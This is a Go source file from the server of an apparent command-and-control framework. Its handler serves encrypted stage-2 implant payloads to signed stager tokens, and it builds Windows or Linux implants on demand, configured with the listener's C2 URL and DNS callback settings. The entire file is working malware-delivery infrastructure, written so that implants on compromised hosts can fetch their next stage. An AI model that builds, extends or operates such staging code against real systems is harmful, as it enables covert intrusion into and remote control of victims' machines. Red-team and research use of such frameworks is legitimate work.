package server

import (
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/forgec2/forgec2/internal/payload"
	"github.com/gin-gonic/gin"
)

// handleServeStage serves the AES-256-GCM encrypted stage-2 payload for a
// signed stage token. The URL must carry a valid HMAC signature (?s=) derived
// from the server stager key, the token must exist and must not be expired.
// The payload is stored and served only in encrypted form; the matching stager
// decrypts it with the per-token key embedded at generation time.
func (s *Server) handleServeStage(c *gin.Context) {
	token := c.Param("token")
	if !isHexToken(token) {
		c.String(http.StatusBadRequest, "invalid stage token")
		return
	}

	sig := c.Query("s")
	if sig == "" || !payload.VerifyStageSignature(token, sig) {
		c.String(http.StatusForbidden, "invalid signature")
		return
	}

	var tok db.StagerToken
	if err := s.db.First(&tok, "token = ?", token).Error; err != nil {
		c.String(http.StatusNotFound, "stage token not found")
		return
	}

	// Bound: the blob is never reachable after the token expires, even though
	// it stays encrypted at rest.
	if time.Now().After(tok.ExpiresAt) {
		c.String(http.StatusGone, "stage token expired")
		return
	}

	dataDir := s.cfg.Server.DataDir
	if dataDir == "" {
		dataDir = "data"
	}

	blob, err := payload.LoadStage2Blob(dataDir, token)
	if err != nil {
		if !os.IsNotExist(err) {
			c.String(http.StatusInternalServerError, "stage not available")
			return
		}
		// Lazy build: stage-2 payloads are generated on first fetch so the
		// (fast) register API does not block on the toolchain.
		if buildErr := s.buildStage2Blob(&tok); buildErr != nil {
			c.String(http.StatusNotFound, "stage not ready")
			return
		}
		blob, err = payload.LoadStage2Blob(dataDir, token)
		if err != nil {
			c.String(http.StatusInternalServerError, "stage not available")
			return
		}
	}

	c.Header("Cache-Control", "no-store")
	c.Data(http.StatusOK, "application/octet-stream", blob)
}

func isHexToken(s string) bool {
	if s == "" {
		return false
	}
	for i := 0; i < len(s); i++ {
		ch := s[i]
		if !((ch >= '0' && ch <= '9') || (ch >= 'a' && ch <= 'f') || (ch >= 'A' && ch <= 'F')) {
			return false
		}
	}
	return true
}

// buildStage2Blob generates the stage-2 payload for a token (Windows or Linux
// per the token's OS/format), encrypts it at rest and removes the transient
// plaintext. Builds for the same token are serialized to avoid redundant
// toolchain invocations when several implants fetch simultaneously.
func (s *Server) buildStage2Blob(tok *db.StagerToken) error {
	unlock := s.stageBuildLock(tok.Token)
	defer unlock()

	dataDir := s.cfg.Server.DataDir
	if dataDir == "" {
		dataDir = "data"
	}
	if _, err := os.Stat(payload.Stage2BlobPath(dataDir, tok.Token)); err == nil {
		return nil
	}

	listener, err := s.resolveListener(tok.ListenerID)
	if err != nil {
		return err
	}

	arch := tok.Architecture
	if arch == "" {
		arch = "amd64"
	}
	format := tok.Format
	if format == "" {
		format = "exe"
	}

	stagerCfg := payload.StagerConfig{
		ListenerID:   tok.ListenerID,
		C2URL:        listener.C2URL,
		Protocol:     listener.Protocol,
		Architecture: arch,
		Format:       format,
		DNSDomain:    listener.DNSDomain,
		DNSServer:    listener.DNSServer,
	}

	agentsDir := s.cfg.Server.DataDir
	if agentsDir == "" {
		agentsDir = "data"
	}
	agentsDir += "/agents"

	var stagePath string
	switch strings.ToLower(tok.OS) {
	case "linux":
		stagePath, err = payload.GenerateStagerStage2Linux(stagerCfg, agentsDir)
	default:
		stagePath, err = payload.GenerateStagerStage2(stagerCfg, agentsDir)
	}
	if err != nil {
		return err
	}

	plaintext, err := os.ReadFile(stagePath)
	if err != nil {
		return err
	}
	if err := payload.WriteStage2Blob(dataDir, tok.Token, plaintext); err != nil {
		return err
	}

	// The transient plaintext build output must not remain on disk.
	_ = os.Remove(stagePath)
	return nil
}

// stageBuildLock returns a per-token mutex used to serialize lazy stage-2
// builds for the same token.
func (s *Server) stageBuildLock(token string) func() {
	s.stageBuildLocksMu.Lock()
	if s.stageBuildLocks == nil {
		s.stageBuildLocks = make(map[string]*sync.Mutex)
	}
	m, ok := s.stageBuildLocks[token]
	if !ok {
		m = &sync.Mutex{}
		s.stageBuildLocks[token] = m
	}
	s.stageBuildLocksMu.Unlock()
	m.Lock()
	return m.Unlock
}